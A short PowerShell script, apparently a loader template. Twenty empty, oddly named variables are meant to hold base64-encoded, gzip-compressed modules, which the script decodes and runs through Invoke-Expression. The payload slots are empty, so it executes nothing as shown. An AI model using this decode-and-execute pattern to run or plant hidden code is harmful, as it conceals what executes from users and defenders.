#Requires -Version 2

$Gwendoline = ""
$Strindberg = ""
$Interlaced = ""
$Wrongdoing = ""
$Menageries = ""
$Masterwork = ""
$Ancestress = ""
$Impalement = ""
$Enrollment = ""
$Introduced = ""
$Suggesting = ""
$Dogcatcher = ""
$Pompadours = ""
$Kohlrabies = ""
$Cotillions = ""
$Anguishing = ""
$Worshipper = ""
$Forbidding = ""
$Bookmaking = ""
$Prevention = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Gwendoline,$Strindberg,$Interlaced,$Wrongdoing,$Menageries,$Masterwork,$Ancestress,$Impalement,$Enrollment,$Introduced,$Suggesting,$Dogcatcher,$Pompadours,$Kohlrabies,$Cotillions,$Anguishing,$Worshipper,$Forbidding,$Bookmaking,$Prevention)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}
